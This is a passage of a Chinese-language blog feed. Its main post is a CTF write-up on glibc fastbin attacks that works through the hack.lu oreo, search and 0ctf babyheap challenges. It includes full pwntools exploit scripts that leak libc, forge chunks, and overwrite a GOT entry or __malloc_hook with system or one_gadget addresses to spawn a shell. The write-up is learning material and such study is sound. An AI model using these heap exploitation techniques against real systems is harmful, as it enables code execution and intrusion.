class=&quot;line&quot;&gt;#运行32位的动态链接程序方法&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qemu-arm -L /usr/arm-linux-gnueabi ./文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装64位的依赖库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#运行64位的动态链接程序方法&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装gdb调试工具&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install git gdb gdb-multiarch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>fastbinin_attack</title>
    <link href="http://yoursite.com/2020/02/07/fastbinin-attack/"/>
    <id>http://yoursite.com/2020/02/07/fastbinin-attack/</id>
    <published>2020-02-07T13:59:05.000Z</published>
    <updated>2020-02-07T14:44:05.996Z</updated>
    
    <content type="html"><![CDATA[<p>就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒<br>好了，废话不多说，开始吧</p><a id="more"></a><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>add<br><img src="/2020/02/07/fastbinin-attack/1.png" alt><br>里面的rifle name是从a288+25开始写，然后description是直接从a288处开始的，总共长度是56字节，地址占了四个字节，56-4 =52   description占25，name则占27<br>具体看汇编<br><img src="/2020/02/07/fastbinin-attack/2.png" alt><br>v1是pre指针     为eax+52，即最后四个字节为指针地址，而这个指针指向的是description。<br>我们可以写入的name有为56，存在溢出，可以覆写pre的地址</p><p>show<br><img src="/2020/02/07/fastbinin-attack/3.png" alt><br>这里show的内容description是指针指向的地址<br>我们可以借此leak出libc</p><p>massage<br><img src="/2020/02/07/fastbinin-attack/4.png" alt><br>进行更改的地方是a2a8里存着的地址指向的地方，利用此来get shell</p><p>order<br><img src="/2020/02/07/fastbinin-attack/5.png" alt><br>这里就是free，free完之后a2a0+1</p><p>1、使pre覆写成puts_got的地址，show的时候，description里面的内容为puts_addr<br>2、构造一个fack chunk，我们知道呢，一个chunk的结构大概是，pre_size, size,内容。我们知道a2a4的地方是写add一次就+1，a2a0是free一次+1，a2a8是存放massage指向内容的地址，可以利用这个构建一个chunk，又因为要绕过题目检查，又存name的地方也有存description的地方，所以要构造下一个chunk，把size 0x41写进去<br>3、改一个got表为system即可，这里改的是scanf，wiki里面改的是strlen（对这个函数我不是很熟，不太懂system最后的传参，就没用了），据说还可以改free_hook 为onegadget（我不会找free_hook的地址，全网搜貌似也没搜出来用这种方法的exp）</p><p>关于wiki上的exp，看了大佬的博客之后才知道以下的姿势（关于strlen的传参）<br>这样就相当于往0x0804a250指向的地址写入system。<br>这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);<br>分号代表system函数将这个参数分成两部分，先后执行里面的命令。<br>因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，<br>就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);<br>这样就能实现最终目的了。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">import sys</span><br><span class="line"># context.binary = &quot;./melong&quot;</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./oreo&apos;)</span><br><span class="line">elf = ELF(&apos;./oreo&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(name,description):</span><br><span class="line"># p.recvuntil(&quot;6. Exit!&quot;)</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line"># p.recvuntil(&quot;Rifle name: &quot;)</span><br><span class="line">p.sendline(name)</span><br><span class="line"># p.recvuntil(&quot;Rifle description: &quot;)</span><br><span class="line">p.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line"></span><br><span class="line">def order():</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def massage(notice):</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">p.sendline(notice)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">name = 27 * &apos;a&apos; + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">add(name ,25 * &apos;a&apos;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line">p.recvuntil(&apos;Description: &apos;)</span><br><span class="line">puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line"># libc_base = libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">onegadget = libc_base + 0x5fbc6 #尝试过把scanf改成onegadget，但是五个都没成功。。。</span><br><span class="line">i=1</span><br><span class="line">for i in range(0x3f): </span><br><span class="line">add(&apos;a&apos; * 27 + p32(0),25 * &apos;a&apos;)  #num -&gt; 0x41</span><br><span class="line"></span><br><span class="line">#num addr = 0x804A2A4</span><br><span class="line"></span><br><span class="line">#fack chunk</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;*27+p32(0x804A2A8),&apos;a&apos;*25)</span><br><span class="line">massage(&apos;\x00&apos;*0x24+p32(0x41)) #description&apos;s chunk</span><br><span class="line"></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line">scanf_got = elf.got[&apos;__isoc99_sscanf&apos;]</span><br><span class="line">add(&apos;a&apos;,p32(scanf_got))</span><br><span class="line"></span><br><span class="line">massage(p32(system_addr))</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-search"><a href="#2015-search" class="headerlink" title="2015 search"></a>2015 search</h2><p>这题就没有很认真的写wp，就把不太明白的点记一下吧</p><p>一开始一直没想到free完一次之后可以查找’\x00’这个word，就一直很迷惑要怎么double free<br>分析两个一开始没懂的点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">index_sentence(&apos;a&apos; * 0x5d + &apos; d &apos;)  #a</span><br><span class="line">index_sentence(&apos;b&apos; * 0x5d + &apos; d &apos;)  #b</span><br><span class="line">index_sentence(&apos;c&apos; * 0x5d + &apos; d &apos;)  #c</span><br><span class="line"> </span><br><span class="line"> # a-&gt;b-&gt;c-&gt;NULL</span><br><span class="line"> search_word(&apos;d&apos;)   #正常的删除 </span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> </span><br><span class="line"> # b-&gt;a-&gt;b-&gt;a-&gt;...      </span><br><span class="line"> search_word(&apos;\x00&apos;)    #首先判断c是否满足条件，由于c是fastbin中的最后一个节点，其fd的值为0，因此不能满足i-&gt;sentence != NULL的条件，因此第一个输出时候删除的是对应的b</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除b</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除a</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除  libc_leak的时候添加的sentence</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br></pre></td></tr></table></figure><p> 最后是只删除了b使得  a-&gt;b-&gt;c-&gt;null 又多了一个头变成了 b-&gt; a-&gt;b-&gt;c-&gt;null 即形成了b-&gt;a-&gt;b-&gt;a-&gt;…的循环，形成了double free</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> #此时的fastbin为 b-&gt;a-&gt;b</span><br><span class="line"># 3. fastbin attack to malloc_hook nearby chunk    向malloc_hook中写东西，改写b-&gt;fd，使其指向malloc_hook附近</span><br><span class="line">fake_chunk_addr = main_arena_addr - 0x33</span><br><span class="line">fake_chunk = p64(fake_chunk_addr).ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(fake_chunk)  #b的fd改成fake_addrs</span><br><span class="line"> index_sentence(&apos;a&apos; * 0x60)   #分配chunk_a</span><br><span class="line"> index_sentence(&apos;b&apos; * 0x60)  #分配chunk_b 填了chunk_b之后才能往fake_chunk里面写payload</span><br><span class="line"> </span><br><span class="line"> one_gadget_addr = libc_base + 0xf02a4</span><br><span class="line"> payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr)  </span><br><span class="line"> payload = payload.ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(payload)    #赋写malloc_hook为one_gadget</span><br></pre></td></tr></table></figure><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p> 先介绍一下Arbitrary Alloc<br>（来自ctf wiki）</p><p>只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><p>example<br>在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1=malloc(0x60);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1=0x7ffff7dd1af5-0x8;</span><br><span class="line">    malloc(0x60);</span><br><span class="line">    chunk_a=malloc(0x60);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0</span><br></pre></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f</span><br></pre></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##define fastbin_index(sz)                                                      \</span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）<br>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 <strong>malloc_hook 的内容 (在我的 libc 中</strong>realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line"> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line"> $rax   : 0x7ffff7dd1afd</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。<br>一般都是在5或者d处（作为最后8和0结尾的地方），所以一般alloc的里面，覆盖malloc_hook的话，要 -0x33（3结尾来对齐)</p><p>okk,开始进入正题<br>在fill里面，发现可以自己重新写size再填内容，和开始alloc的大小可以不一样，然后free没有清零，以此制造overlap</p><p>第一步先 用overlap leak基址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80) #覆写最后一字节，将free掉的2指向4的地址</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21) #把4的size改成0x21,下一次alloc的时候可以写入这个地方</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91) #指向4之后再将大小改回来</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80) #5 如果没有这个，free就没了，打不出来地址</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬</span><br></pre></td></tr></table></figure><p>第二步就构造chunk，使one_gadget能写到mollac_hook的地址里，<br>0x80可以写下0x60的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure><p>idx为5，则找7f，就开始提到的arbitrary alloc的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 